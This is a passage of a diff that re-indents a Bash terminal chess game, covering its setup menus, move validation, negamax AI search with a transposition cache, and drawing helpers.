-							colorlist+=" ${colors[$c]^} figures"
-						done
-						local dlg_player_color
-						if dlg_player_color=$(dlg --nocancel --default-item "${colors[$colorPlayerA]^}" --menu "Color of $option_mainmenu_playerA" $dlgh $dlgw 0 "$colorlist") ; then
-							getColor "$dlg_player_color" || colorPlayerA=$?
-						fi
-					fi
-					;;
+if $color ; then
+	local colorlist=""
+	local c
+for (( c=1; c<7; c++ )) ; do
+	colorlist+=" ${colors[$c]^} figures"
+done
+	local dlg_player_color
+if dlg_player_color=$(dlg --nocancel --default-item "${colors[$colorPlayerA]^}" --menu "Color of $option_mainmenu_playerA" $dlgh $dlgw 0 "$colorlist") ; then
+	getColor "$dlg_player_color" || colorPlayerA=$?
+fi
+fi ;;
 # Player B settings
-				"$option_mainmenu_playerB" )
-					typeOfPlayerB > /dev/null
-					local type=$?
-					local dlg_player
-					dlg_player=$(dlg --nocancel --default-item "${option_player[$type]}" --menu "$option_mainmenu_playerB" $dlgh $dlgw 0 "${option_player[0]}" "$( isAI $B && echo "$option_mainmenu_playerB" || echo "$namePlayerB" )" "${option_player[1]}" "with AI (of strength $strength)" "${option_player[2]}" "Wait for connections on port $port" )
-					case "$dlg_player" in
+"$option_mainmenu_playerB" )
+	typeOfPlayerB > /dev/null
+	local type=$?
+	local dlg_player
+	dlg_player=$(dlg --nocancel --default-item "${option_player[$type]}" --menu "$option_mainmenu_playerB" $dlgh $dlgw 0 "${option_player[0]}" "$( isAI $B && echo "$option_mainmenu_playerB" || echo "$namePlayerB" )" "${option_player[1]}" "with AI (of strength $strength)" "${option_player[2]}" "Wait for connections on port $port" )
+case "$dlg_player" in
 # Human --> get Name
-						*"${option_player[0]}"* )
-							[[ "$remote" -eq "1" ]] && remote=0
-							local dlg_namePlayer
-							dlg_namePlayer=$(dlg --inputbox "Name of $option_mainmenu_playerB" $dlgh $dlgw "$( isAI $B && echo "$option_mainmenu_playerB" || echo "$namePlayerB" )") && namePlayerA="$dlg_namePlayer"
-							;;
+	*"${option_player[0]}"* )
+		[[ "$remote" -eq "1" ]] && remote=0
+		local dlg_namePlayer
+		dlg_namePlayer=$(dlg --inputbox "Name of $option_mainmenu_playerB" $dlgh $dlgw "$( isAI $B && echo "$option_mainmenu_playerB" || echo "$namePlayerB" )") && namePlayerA="$dlg_namePlayer"
+ ;;
 # Computer --> get Strength
-						*"${option_player[1]}"* )
-							[[ "$remote" -eq "1" ]] && remote=0
-							namePlayerB=$aikeyword
-							local dlg_strength
-							if dlg_strength=$(dlg --inputbox "Strength of Computer" $dlgh $dlgw  "$strength") ; then
-								if validNumber "$dlg_strength" ; then
-									strength=$dlg_strength
-								else
-									dlgerror "Your input '$dlg_strength' is not a valid number!"
-								fi
-							fi
-							;;
+	*"${option_player[1]}"* )
+		[[ "$remote" -eq "1" ]] && remote=0
+		namePlayerB=$aikeyword
+		local dlg_strength
+	if dlg_strength=$(dlg --inputbox "Strength of Computer" $dlgh $dlgw  "$strength") ; then
+	if validNumber "$dlg_strength" ; then
+		strength=$dlg_strength
+	else
+		dlgerror "Your input '$dlg_strength' is not a valid number!"
+	fi
+	fi ;;
 # Network --> get Server and Port
-						*"${option_player[2]}"* )
-							remote=1
-							local dlg_networkport
-							if dlg_networkport=$(dlg --inputbox "Server Port (non privileged)" $dlgh $dlgw "$port") ; then
-								 if validPort "$dlg_networkport" ; then
-									port=$dlg_networkport
-								else
-									dlgerror "Your input '$dlg_remoteip' is not a valid Port!"
-								fi
-							fi
-							;;
-					esac
+	*"${option_player[2]}"* )
+		remote=1
+		local dlg_networkport
+	if dlg_networkport=$(dlg --inputbox "Server Port (non privileged)" $dlgh $dlgw "$port") ; then
+	 if validPort "$dlg_networkport" ; then
+		port=$dlg_networkport
+	else
+		dlgerror "Your input '$dlg_remoteip' is not a valid Port!"
+	fi
+	fi ;;
+esac
 # Player color
-					if $color ; then
-						local colorlist=""
-						local c
-						for (( c=1; c<7; c++ )) ; do
-							colorlist+=" ${colors[$c]^} figures"
-						done
-						local dlg_player_color
-						if dlg_player_color=$(dlg --nocancel --default-item "${colors[$colorPlayerB]^}" --menu "Color of $option_mainmenu_playerB" $dlgh $dlgw 0 "$colorlist") ; then
-							getColor "$dlg_player_color" || colorPlayerB=$?
-						fi
-					fi
-					;;
+if $color ; then
+	local colorlist=""
+	local c
+for (( c=1; c<7; c++ )) ; do
+	colorlist+=" ${colors[$c]^} figures"
+done
+	local dlg_player_color
+	if dlg_player_color=$(dlg --nocancel --default-item "${colors[$colorPlayerB]^}" --menu "Color of $option_mainmenu_playerB" $dlgh $dlgw 0 "$colorlist") ; then
+		getColor "$dlg_player_color" || colorPlayerB=$?
+fi
+fi ;;
 # Game settings
-				"$option_mainmenu_settings" )
-					if dlg_settings=$(dlg --separate-output --checklist "$option_mainmenu_settings" $dlgh $dlgw $dlgw "${option_settings[0]}" "with movements and figures" $($color && echo $dlg_on || echo $dlg_off) "${option_settings[1]}" "optional including board labels" $($ascii && echo $dlg_off || echo $dlg_on) "${option_settings[2]}" "be chatty" $($warnings && echo $dlg_on || echo $dlg_off) "${option_settings[3]}" "be clicky" $($mouse && echo $dlg_on || echo $dlg_off) "${option_settings[4]}" "in a regluar file" $([[ -n "$cache" ]] && echo $dlg_on || echo $dlg_off) ) ; then
+	"$option_mainmenu_settings" )
+	if dlg_settings=$(dlg --separate-output --checklist "$option_mainmenu_settings" $dlgh $dlgw $dlgw "${option_settings[0]}" "with movements and figures" $($color && echo $dlg_on || echo $dlg_off) "${option_settings[1]}" "optional including board labels" $($ascii && echo $dlg_off || echo $dlg_on) "${option_settings[2]}" "be chatty" $($warnings && echo $dlg_on || echo $dlg_off) "${option_settings[3]}" "be clicky" $($mouse && echo $dlg_on || echo $dlg_off) "${option_settings[4]}" "in a regluar file" $([[ -n "$cache" ]] && echo $dlg_on || echo $dlg_off) ) ; then
 # Color support
-						if [[ "$dlg_settings" == *"${option_settings[0]}"* ]] ; then
-							color=true
-							dlg --yesno "Enable movement helper (colorize possible move)?" $dlgh $dlgw && colorHelper=true || colorHelper=false
-							dlg --yesno "Use filled (instead of outlined) figures for both player?" $dlgh $dlgw && colorFill=true || colorFill=false
-						else
-							color=false
-							colorFill=false
-							colorHelper=false
-						fi
+	if [[ "$dlg_settings" == *"${option_settings[0]}"* ]] ; then
+		color=true
+		dlg --yesno "Enable movement helper (colorize possible move)?" $dlgh $dlgw && colorHelper=true || colorHelper=false
+		dlg --yesno "Use filled (instead of outlined) figures for both player?" $dlgh $dlgw && colorFill=true || colorFill=false
+	else
+		color=false
+		colorFill=false
+		colorHelper=false
+	fi
 # Unicode support
-						if [[ "$dlg_settings" == *"${option_settings[1]}"* ]] ; then
-							ascii=false
-							( dlg --yesno "Use Unicode for board labels?" $dlgh $dlgw ) && unicodelabels=true || unicodelabels=false
-						else
-							ascii=true
-							unicodelabels=false
-						fi
+	if [[ "$dlg_settings" == *"${option_settings[1]}"* ]] ; then
+		ascii=false
+		( dlg --yesno "Use Unicode for board labels?" $dlgh $dlgw ) && unicodelabels=true || unicodelabels=false
+	else
+		ascii=true
+		unicodelabels=false
+	fi
 # Verbose messages
-						[[ "$dlg_settings" == *"${option_settings[2]}"* ]] && warnings=true || warnings=false
+[[ "$dlg_settings" == *"${option_settings[2]}"* ]] && warnings=true || warnings=false
 # Mouse support
-						[[ "$dlg_settings" == *"${option_settings[3]}"* ]] && mouse=true || mouse=false
+[[ "$dlg_settings" == *"${option_settings[3]}"* ]] && mouse=true || mouse=false
 # AI Cache
-						local dlg_cache
-						if [[ "$dlg_settings" == *"${option_settings[4]}"* ]] && dlg_cache=$(dlg --inputbox "Cache file:" $dlgh $dlgw "$([[ -z "$cache" ]] && echo "$(pwd)/chessbash.cache" || echo "$cache")") && [[ -n "$dlg_cache" ]] ; then
-							cache="$dlg_cache"
-							type gzip >/dev/null 2>&1 && type zcat >/dev/null 2>&1 && dlg --yesno "Use GZip compression for Cache?" $dlgh $dlgw && cachecompress=true || cachecompress=false
-						else
-							cache=""
-						fi
+local dlg_cache
+	if [[ "$dlg_settings" == *"${option_settings[4]}"* ]] && dlg_cache=$(dlg --inputbox "Cache file:" $dlgh $dlgw "$([[ -z "$cache" ]] && echo "$(pwd)/chessbash.cache" || echo "$cache")") && [[ -n "$dlg_cache" ]] ; then
+		cache="$dlg_cache"
+		type gzip >/dev/null 2>&1 && type zcat >/dev/null 2>&1 && dlg --yesno "Use GZip compression for Cache?" $dlgh $dlgw && cachecompress=true || cachecompress=false
+	else
+		cache=""
+	fi
 # Waiting time (ask always)
-						local dlg_sleep
-						if dlg_sleep=$(dlg --inputbox "How long should every message be displayed (in seconds)?" $dlgh $dlgw "$sleep") ; then
-							if validNumber "$dlg_sleep" ; then
-								sleep=$dlg_sleep
-							else
-								dlgerror "Your input '$dlg_sleep' is not a valid number!"
-							fi
-						fi
-					fi
-					;;
+local dlg_sleep
+	if dlg_sleep=$(dlg --inputbox "How long should every message be displayed (in seconds)?" $dlgh $dlgw "$sleep") ; then
+	if validNumber "$dlg_sleep" ; then
+		sleep=$dlg_sleep
+	else
+		dlgerror "Your input '$dlg_sleep' is not a valid number!"
+	fi
+	fi
+	fi ;;
 # Other --> exit (gdialog)
-				* )
-					break
-					;;
-			esac
-		done
+	* )
+	break ;;
+	esac
+	done
 	}
-
 # start config dialog
 	dlgconfig
 fi
@@ -1464,11 +1492,11 @@ declare -A cacheDepth
 # associative arrays are faster than numeric ones and way more readable
 declare -A redraw
 if $cursor ; then
-	for (( y=0; y<10; y++ )) ; do
-		for (( x=-2; x<8; x++ )) ; do
-			redraw[$y,$x]=""
-		done
+for (( y=0; y<10; y++ )) ; do
+	for (( x=-2; x<8; x++ )) ; do
+		redraw[$y,$x]=""
 	done
+done
 fi
 declare -A field
 # initialize setting - first row
@@ -1515,28 +1543,28 @@ function coord() {
 #	$1	player
 # Writes name to stdout
 function namePlayer() {
-	if (( $1 < 0 )) ; then
-		if $color ; then
-			echo -en "\e[3${colorPlayerA}m"
-		fi
-		if isAI "$1" ; then
-			echo -n "$aiPlayerA"
-		else
-			echo -n "$namePlayerA"
-		fi
-	else
-		if $color ; then
-			echo -en "\e[3${colorPlayerB}m"
-		fi
-		if isAI "$1" ; then
-			echo -n "$aiPlayerB"
-		else
-			echo -n "$namePlayerB"
-		fi
-	fi
+if (( $1 < 0 )) ; then
 	if $color ; then
-		echo -en "\e[0m"
+		echo -en "\e[3${colorPlayerA}m"
 	fi
+	if isAI "$1" ; then
+		echo -n "$aiPlayerA"
+	else
+		echo -n "$namePlayerA"
+	fi
+else
+	if $color ; then
+		echo -en "\e[3${colorPlayerB}m"
+	fi
+	if isAI "$1" ; then
+		echo -n "$aiPlayerB"
+	else
+		echo -n "$namePlayerB"
+	fi
+fi
+if $color ; then
+	echo -en "\e[0m"
+fi
 }
 # Get name of figure
 # Params:
@@ -1555,17 +1583,17 @@ function nameFigure() {
 #	$1	player
 # Return status code 1 if no king
 function hasKing() {
-	local player=$1;
-	local x
-	local y
-	for (( y=0;y<8;y++ )) ; do
-		for (( x=0;x<8;x++ )) ; do
-			if (( ${field[$y,$x]} * player == 6 )) ; then
-				return 0
-			fi
-		done
+local player=$1;
+local x
+local y
+for (( y=0;y<8;y++ )) ; do
+	for (( x=0;x<8;x++ )) ; do
+		if (( ${field[$y,$x]} * player == 6 )) ; then
+		return 0
+		fi
 	done
-	return 1
+done
+return 1
 }
 # Check validity of a concrete single movement
 # Params:
@@ -1581,7 +1609,6 @@ function canMove() {
 	local toY=$3
 	local toX=$4
 	local player=$5
-
 	local i
 	if (( fromY < 0 || fromY >= 8 || fromX < 0 || fromX >= 8 || toY < 0 || toY >= 8 || toX < 0 || toX >= 8 || ( fromY == toY && fromX == toX ) )) ; then
 		return 1
@@ -1592,57 +1619,57 @@ function canMove() {
 	if (( from == 0 || from * player < 0 || to * player > 0 || player * player != 1 )) ; then
 		return 1
 # pawn
-	elif (( fig == 1 )) ; then
-		if (( fromX == toX && to == 0 && ( toY - fromY == player || ( toY - fromY == 2 * player && ${field["$((player + fromY)),$fromX"]} == 0 && fromY == ( player > 0 ? 1 : 6 ) ) ) )) ; then
-				return 0
-			else
-				return $(( ! ( (fromX - toX) * (fromX - toX) == 1 && toY - fromY == player && to * player < 0 ) ))
-		fi
+elif (( fig == 1 )) ; then
+	if (( fromX == toX && to == 0 && ( toY - fromY == player || ( toY - fromY == 2 * player && ${field["$((player + fromY)),$fromX"]} == 0 && fromY == ( player > 0 ? 1 : 6 ) ) ) )) ; then
+		return 0
+		else
+		return $(( ! ( (fromX - toX) * (fromX - toX) == 1 && toY - fromY == player && to * player < 0 ) ))
+	fi
 # queen, rock and bishop
-	elif (( fig == 5 || fig == 4  || fig == 3 )) ; then
+elif (( fig == 5 || fig == 4  || fig == 3 )) ; then
 # rock - and queen
-		if (( fig != 3 )) ; then
-			if (( fromX == toX )) ; then
-				for (( i = ( fromY < toY ? fromY : toY ) + 1 ; i < ( fromY > toY ? fromY : toY ) ; i++ )) ; do
-					if (( ${field[$i,$fromX]} != 0 )) ; then
-						return 1
-					fi
-				done
-				return 0
-			elif (( fromY == toY )) ; then
-				for (( i = ( fromX < toX ? fromX : toX ) + 1 ; i < ( fromX > toX ? fromX : toX ) ; i++ )) ; do
-						if (( ${field[$fromY,$i]} != 0 )) ; then
-							return 1
-						fi
-				done
-				return 0
+	if (( fig != 3 )) ; then
+	if (( fromX == toX )) ; then
+		for (( i = ( fromY < toY ? fromY : toY ) + 1 ; i < ( fromY > toY ? fromY : toY ) ; i++ )) ; do
+		if (( ${field[$i,$fromX]} != 0 )) ; then
+			return 1
 			fi
-		fi
-# bishop - and queen
-		if (( fig != 4 )) ; then
-			if (( ( fromY - toY ) * ( fromY - toY ) != ( fromX - toX ) * ( fromX - toX ) )) ; then
-				return 1
+			done
+			return 0
+elif (( fromY == toY )) ; then
+	for (( i = ( fromX < toX ? fromX : toX ) + 1 ; i < ( fromX > toX ? fromX : toX ) ; i++ )) ; do
+	if (( ${field[$fromY,$i]} != 0 )) ; then
+			return 1
 			fi
-			for (( i = 1 ; i < ( $fromY > toY ? fromY - toY : toY - fromY) ; i++ )) ; do
-				if (( ${field[$((fromY + i * (toY - fromY > 0 ? 1 : -1 ) )),$(( fromX + i * (toX - fromX > 0 ? 1 : -1 ) ))]} != 0 )) ; then
-					return 1
-				fi
 			done
 			return 0
 		fi
-# nothing found? wrong move.
-		return 1
-# knight
-	elif (( fig == 2 )) ; then
-		return $(( ! ( ( ( fromY - toY == 2 || fromY - toY == -2) && ( fromX - toX == 1 || fromX - toX == -1 ) ) || ( ( fromY - toY == 1 || fromY - toY == -1) && ( fromX - toX == 2 || fromX - toX == -2 ) ) ) ))
-# king
-	elif (( fig == 6 )) ; then
-		return $(( !( ( ( fromX - toX ) * ( fromX - toX ) ) <= 1 &&  ( ( fromY - toY ) * ( fromY - toY ) ) <= 1 ) ))
-# invalid figure
-	else
-		error "Invalid figure '$from'!"
-		exit 1
 	fi
+# bishop - and queen
+if (( fig != 4 )) ; then
+	if (( ( fromY - toY ) * ( fromY - toY ) != ( fromX - toX ) * ( fromX - toX ) )) ; then
+	return 1
+	fi
+	for (( i = 1 ; i < ( $fromY > toY ? fromY - toY : toY - fromY) ; i++ )) ; do
+	if (( ${field[$((fromY + i * (toY - fromY > 0 ? 1 : -1 ) )),$(( fromX + i * (toX - fromX > 0 ? 1 : -1 ) ))]} != 0 )) ; then
+		return 1
+		fi
+		done
+		return 0
+fi
+# nothing found? wrong move.
+	return 1
+# knight
+elif (( fig == 2 )) ; then
+	return $(( ! ( ( ( fromY - toY == 2 || fromY - toY == -2) && ( fromX - toX == 1 || fromX - toX == -1 ) ) || ( ( fromY - toY == 1 || fromY - toY == -1) && ( fromX - toX == 2 || fromX - toX == -2 ) ) ) ))
+# king
+elif (( fig == 6 )) ; then
+	return $(( !( ( ( fromX - toX ) * ( fromX - toX ) ) <= 1 &&  ( ( fromY - toY ) * ( fromY - toY ) ) <= 1 ) ))
+# invalid figure
+else
+	error "Invalid figure '$from'!"
+	exit 1
+fi
 }
 # minimax (game theory) algorithm for evaluate possible movements
 # (the heart of your computer enemy)
@@ -1656,210 +1683,210 @@ function canMove() {
 #	$5	preserves the best move (for ai) if true
 # Returns best value as status code
 function negamax() {
-	local depth=$1
-	local a=$2
-	local b=$3
-	local player=$4
-	local save=$5
+local depth=$1
+local a=$2
+local b=$3
+local player=$4
+local save=$5
 # transposition table
-	local aSave=$a
-	local hash
-	hash="$player ${field[@]}"
-	if ! $save && test "${cacheLookup[$hash]+set}" && (( ${cacheDepth[$hash]} >= depth )) ; then
-		local value=${cacheLookup[$hash]}
-		local flag=${cacheFlag[$hash]}
-		if (( flag == 0 )) ; then
-			return $value
-		elif (( flag == 1 && value > a )) ; then
-			a=$value
-		elif (( flag == -1 && value < b )) ; then
-			b=$value
-		fi
-		if (( a >= b )) ; then
-			return $value
-		fi
+local aSave=$a
+local hash
+hash="$player ${field[@]}"
+if ! $save && test "${cacheLookup[$hash]+set}" && (( ${cacheDepth[$hash]} >= depth )) ; then
+	local value=${cacheLookup[$hash]}
+	local flag=${cacheFlag[$hash]}
+	if (( flag == 0 )) ; then
+		return $value
+	elif (( flag == 1 && value > a )) ; then
+		a=$value
+	elif (( flag == -1 && value < b )) ; then
+		b=$value
 	fi
+	if (( a >= b )) ; then
+		return $value
+	fi
+fi
 # lost own king?
-	if ! hasKing "$player" ; then
-		cacheLookup[$hash]=$(( strength - depth + 1 ))
-		cacheDepth[$hash]=$depth
-		cacheFlag[$hash]=0
-		return $(( strength - depth + 1 ))
+if ! hasKing "$player" ; then
+	cacheLookup[$hash]=$(( strength - depth + 1 ))
+	cacheDepth[$hash]=$depth
+	cacheFlag[$hash]=0
+	return $(( strength - depth + 1 ))
 # use heuristics in depth
-	elif (( depth <= 0 )) ; then
-		local values=0
-		for (( y=0; y<8; y++ )) ; do
-			for (( x=0; x<8; x++ )) ; do
-				local fig=${field[$y,$x]}
-				if (( ${field[$y,$x]} != 0 )) ; then
-					local figPlayer=$(( fig < 0 ? -1 : 1 ))
+elif (( depth <= 0 )) ; then
+	local values=0
+	for (( y=0; y<8; y++ )) ; do
+		for (( x=0; x<8; x++ )) ; do
+			local fig=${field[$y,$x]}
+			if (( ${field[$y,$x]} != 0 )) ; then
+				local figPlayer=$(( fig < 0 ? -1 : 1 ))
 # a more simple heuristic would be values=$(( $values + $fig ))
-					(( values += ${figValues[$fig * $figPlayer]} * figPlayer ))
+	(( values += ${figValues[$fig * $figPlayer]} * figPlayer ))
 # pawns near to end are better
-					if (( fig == 1 )) ; then
-						if (( figPlayer > 0 )) ; then
-							(( values += ( y - 1 ) / 2 ))
-						else
-							(( values -= ( 6 + y ) / 2 ))
-						fi
-					fi
-				fi
-			done
-		done
-		values=$(( 127 + ( player * values ) ))
+if (( fig == 1 )) ; then
+	if (( figPlayer > 0 )) ; then
+	(( values += ( y - 1 ) / 2 ))
+else
+	(( values -= ( 6 + y ) / 2 ))
+fi
+fi
+fi
+done
+done
+	values=$(( 127 + ( player * values ) ))
 # ensure valid bash return range
-		if (( values > 253 - strength )) ; then
-			values=$(( 253 - strength ))
-		elif (( values < 2 + strength )) ; then
-			values=$(( 2 + strength ))
-		fi
-		cacheLookup[$hash]=$values
-		cacheDepth[$hash]=0
-		cacheFlag[$hash]=0
-		return $values
+if (( values > 253 - strength )) ; then
+	values=$(( 253 - strength ))
+elif (( values < 2 + strength )) ; then
+	values=$(( 2 + strength ))
+fi
+	cacheLookup[$hash]=$values
+	cacheDepth[$hash]=0
+	cacheFlag[$hash]=0
+	return $values
 # calculate best move
-	else
-		local bestVal=0
-		local fromY
-		local fromX
-		local toY
-		local toX
-		local i
-		local j
-		for (( fromY=0; fromY<8; fromY++ )) ; do
-			for (( fromX=0; fromX<8; fromX++ )) ; do
-				local fig=$(( ${field[$fromY,$fromX]} * ( player ) ))
+else
+	local bestVal=0
+	local fromY
+	local fromX
+	local toY
+	local toX
+	local i
+	local j
+	for (( fromY=0; fromY<8; fromY++ )) ; do
+		for (( fromX=0; fromX<8; fromX++ )) ; do
+		local fig=$(( ${field[$fromY,$fromX]} * ( player ) ))
 # precalc possible fields (faster then checking every 8*8 again)
-				local targetY=()
-				local targetX=()
-				local t=0
+	local targetY=()
+	local targetX=()
+	local t=0
 # empty or enemy
-				if (( fig <= 0 )) ; then
-					continue
+if (( fig <= 0 )) ; then
+	continue
 # pawn
-				elif (( fig == 1 )) ; then
-					targetY[$t]=$(( player + fromY ))
-					targetX[$t]=$(( fromX ))
-					(( t += 1 ))
-					targetY[$t]=$(( 2 * player + fromY ))
-					targetX[$t]=$(( fromX ))
-					(( t += 1 ))
-					targetY[$t]=$(( player + fromY ))
-					targetX[$t]=$(( fromX + 1 ))
-					(( t += 1 ))
-					targetY[$t]=$(( player + fromY ))
-					targetX[$t]=$(( fromX - 1 ))
-					(( t += 1 ))
+elif (( fig == 1 )) ; then
+	targetY[$t]=$(( player + fromY ))
+	targetX[$t]=$(( fromX ))
+	(( t += 1 ))
+	targetY[$t]=$(( 2 * player + fromY ))
+	targetX[$t]=$(( fromX ))
+	(( t += 1 ))
+	targetY[$t]=$(( player + fromY ))
+	targetX[$t]=$(( fromX + 1 ))
+	(( t += 1 ))
+	targetY[$t]=$(( player + fromY ))
+	targetX[$t]=$(( fromX - 1 ))
+	(( t += 1 ))
 # knight
-				elif (( fig == 2 )) ; then
-					for (( i=-1 ; i<=1 ; i=i+2 )) ; do
-						for (( j=-1 ; j<=1 ; j=j+2 )) ; do
-							targetY[$t]=$(( fromY + 1 * i ))
-							targetX[$t]=$(( fromX + 2 * j ))
-							(( t + 1 ))
-							targetY[$t]=$(( fromY + 2 * i ))
-							targetX[$t]=$(( fromX + 1 * j ))
-							(( t + 1 ))
-						done
-					done
+elif (( fig == 2 )) ; then
+	for (( i=-1 ; i<=1 ; i=i+2 )) ; do
+	for (( j=-1 ; j<=1 ; j=j+2 )) ; do
+		targetY[$t]=$(( fromY + 1 * i ))
+		targetX[$t]=$(( fromX + 2 * j ))
+		(( t + 1 ))
+		targetY[$t]=$(( fromY + 2 * i ))
+		targetX[$t]=$(( fromX + 1 * j ))
+		(( t + 1 ))
+done
+done
 # king
-				elif (( fig == 6 )) ; then
-					for (( i=-1 ; i<=1 ; i++ )) ; do
-						for (( j=-1 ; j<=1 ; j++ )) ; do
-							targetY[$t]=$(( fromY + i ))
-							targetX[$t]=$(( fromX + j ))
-							(( t += 1 ))
-						done
-					done
-				else
+elif (( fig == 6 )) ; then
+	for (( i=-1 ; i<=1 ; i++ )) ; do
+	for (( j=-1 ; j<=1 ; j++ )) ; do
+	targetY[$t]=$(( fromY + i ))
+	targetX[$t]=$(( fromX + j ))
+	(( t += 1 ))
+	done
+done
+else
 # bishop or queen
-					if (( fig != 4 )) ; then
-						for (( i=-8 ; i<=8 ; i++ )) ; do
-							if (( i != 0 )) ; then
+if (( fig != 4 )) ; then
+	for (( i=-8 ; i<=8 ; i++ )) ; do
+	if (( i != 0 )) ; then
 # can be done nicer but avoiding two loops!
-								targetY[$t]=$(( fromY + i ))
-								targetX[$t]=$(( fromX + i ))
-								(( t += 1 ))
-								targetY[$t]=$(( fromY - i ))
-								targetX[$t]=$(( fromX - i ))
-								(( t += 1 ))
-								targetY[$t]=$(( fromY + i ))
-								targetX[$t]=$(( fromX - i ))
-								(( t += 1 ))
-								targetY[$t]=$(( fromY - i ))
-								targetX[$t]=$(( fromX + i ))
-								(( t += 1 ))
-							fi
-						done
-					fi
+		targetY[$t]=$(( fromY + i ))
+		targetX[$t]=$(( fromX + i ))
+		(( t += 1 ))
+		targetY[$t]=$(( fromY - i ))
+		targetX[$t]=$(( fromX - i ))
+		(( t += 1 ))
+		targetY[$t]=$(( fromY + i ))
+		targetX[$t]=$(( fromX - i ))
+		(( t += 1 ))
+		targetY[$t]=$(( fromY - i ))
+		targetX[$t]=$(( fromX + i ))
+		(( t += 1 ))
+	fi
+	done
+fi
 # rock or queen
-					if (( fig != 3 )) ; then
-						for (( i=-8 ; i<=8 ; i++ )) ; do
-							if (( i != 0 )) ; then
-								targetY[$t]=$(( fromY + i ))
-								targetX[$t]=$(( fromX ))
-								(( t += 1 ))
-								targetY[$t]=$(( fromY - i ))
-								targetX[$t]=$(( fromX ))
-								(( t += 1 ))
-								targetY[$t]=$(( fromY ))
-								targetX[$t]=$(( fromX + i ))
-								(( t += 1 ))
-								targetY[$t]=$(( fromY ))
-								targetX[$t]=$(( fromX - i ))
-								(( t += 1 ))
-							fi
-						done
-					fi
-				fi
+if (( fig != 3 )) ; then
+	for (( i=-8 ; i<=8 ; i++ )) ; do
+	if (( i != 0 )) ; then
+		targetY[$t]=$(( fromY + i ))
+		targetX[$t]=$(( fromX ))
+		(( t += 1 ))
+		targetY[$t]=$(( fromY - i ))
+		targetX[$t]=$(( fromX ))
+		(( t += 1 ))
+		targetY[$t]=$(( fromY ))
+		targetX[$t]=$(( fromX + i ))
+		(( t += 1 ))
+		targetY[$t]=$(( fromY ))
+		targetX[$t]=$(( fromX - i ))
+		(( t += 1 ))
+	fi
+	done
+	fi
+fi
 # process all available moves
-				for (( j=0; j < t; j++ )) ; do
-					local toY=${targetY[$j]}
-					local toX=${targetX[$j]}
+for (( j=0; j < t; j++ )) ; do
+	local toY=${targetY[$j]}
+	local toX=${targetX[$j]}
 # move is valid
-					if (( toY >= 0 && toY < 8 && toX >= 0 && toX < 8 )) &&  canMove "$fromY" "$fromX" "$toY" "$toX" "$player" ; then
-						local oldFrom=${field[$fromY,$fromX]};
-						local oldTo=${field[$toY,$toX]};
-						field[$fromY,$fromX]=0
-						field[$toY,$toX]=$oldFrom
+if (( toY >= 0 && toY < 8 && toX >= 0 && toX < 8 )) &&  canMove "$fromY" "$fromX" "$toY" "$toX" "$player" ; then
+	local oldFrom=${field[$fromY,$fromX]};
+	local oldTo=${field[$toY,$toX]};
+	field[$fromY,$fromX]=0
+	field[$toY,$toX]=$oldFrom
 # pawn to queen
-						if (( oldFrom == player && toY == ( player > 0 ? 7 : 0 ) )) ;then
-							field["$toY,$toX"]=$(( 5 * player ))
-						fi
+if (( oldFrom == player && toY == ( player > 0 ? 7 : 0 ) )) ;then
+	field["$toY,$toX"]=$(( 5 * player ))
+fi
 # recursion
-						negamax $(( depth - 1 )) $(( 255 - b )) $(( 255 - a )) $(( player * (-1) )) false
-						local val=$(( 255 - $? ))
-						field[$fromY,$fromX]=$oldFrom
-						field[$toY,$toX]=$oldTo
-						if (( val > bestVal )) ; then
-							bestVal=$val
-							if $save ; then
-								selectedX=$fromX
-								selectedY=$fromY
-								selectedNewX=$toX
-								selectedNewY=$toY
-							fi
-						fi
-						if (( val > a )) ; then
-							a=$val
-						fi
-						if (( a >= b )) ; then
-							break 3
-						fi
-					fi
-				done
-			done
+negamax $(( depth - 1 )) $(( 255 - b )) $(( 255 - a )) $(( player * (-1) )) false
+local val=$(( 255 - $? ))
+field[$fromY,$fromX]=$oldFrom
+field[$toY,$toX]=$oldTo
+	if (( val > bestVal )) ; then
+		bestVal=$val
+	if $save ; then
+		selectedX=$fromX
+		selectedY=$fromY
+		selectedNewX=$toX
+		selectedNewY=$toY
+	fi
+	fi
+	if (( val > a )) ; then
+		a=$val
+	fi
+	if (( a >= b )) ; then
+		break 3
+	fi
+	fi
 		done
-		cacheLookup[$hash]=$bestVal
-		cacheDepth[$hash]=$depth
-		if (( bestVal <= aSave )) ; then
-			cacheFlag[$hash]=1
-		elif (( bestVal >= b )) ; then
-			cacheFlag[$hash]=-1
-		else
-			cacheFlag[$hash]=0
-		fi
-		return $bestVal
+	done
+done
+cacheLookup[$hash]=$bestVal
+cacheDepth[$hash]=$depth
+	if (( bestVal <= aSave )) ; then
+		cacheFlag[$hash]=1
+	elif (( bestVal >= b )) ; then
+		cacheFlag[$hash]=-1
+	else
+		cacheFlag[$hash]=0
+	fi
+	return $bestVal
 	fi
 }
 # Perform a concrete single movement
@@ -1872,18 +1899,18 @@ function negamax() {
 #	$selectedNewX
 # Return status code 0 if movement was successfully performed
 function move() {
-	local player=$1
-	if canMove "$selectedY" "$selectedX" "$selectedNewY" "$selectedNewX" "$player" ; then
-		local fig=${field[$selectedY,$selectedX]}
-		field[$selectedY,$selectedX]=0
-		field[$selectedNewY,$selectedNewX]=$fig
+local player=$1
+if canMove "$selectedY" "$selectedX" "$selectedNewY" "$selectedNewX" "$player" ; then
+	local fig=${field[$selectedY,$selectedX]}
+	field[$selectedY,$selectedX]=0
+	field[$selectedNewY,$selectedNewX]=$fig
 # pawn to queen
-		if (( fig == player && selectedNewY == ( player > 0 ? 7 : 0 ) )) ; then
-			field[$selectedNewY,$selectedNewX]=$(( 5 * player ))
-		fi
-		return 0
-	fi
-	return 1
+if (( fig == player && selectedNewY == ( player > 0 ? 7 : 0 ) )) ; then
+	field[$selectedNewY,$selectedNewX]=$(( 5 * player ))
+fi
+return 0
+fi
+return 1
 }
 # Unicode helper function (for draw)
 # Params:
@@ -1893,9 +1920,9 @@ function move() {
 #	$4	integer offset of third hex
 # Outputs escape character
 function unicode() {
-	if ! $ascii ; then
-		printf '\\x%s\\x%s\\x%x' "$1" "$2" "$(( 0x$3 + ( $4 ) ))"
-	fi
+if ! $ascii ; then
+	printf '\\x%s\\x%s\\x%x' "$1" "$2" "$(( 0x$3 + ( $4 ) ))"
+fi
 }
 # Ascii helper function (for draw)
 # Params:
@@ -1914,12 +1941,12 @@ function ord() {
 # Audio and visual bell
 # No params or return
 function bell() {
-	if (( lastBell != SECONDS )) ; then
-		echo -en "\a\e[?5h"
-		sleep 0.1
-		echo -en "\e[?5l"
-		lastBell=$SECONDS
-	fi
+if (( lastBell != SECONDS )) ; then
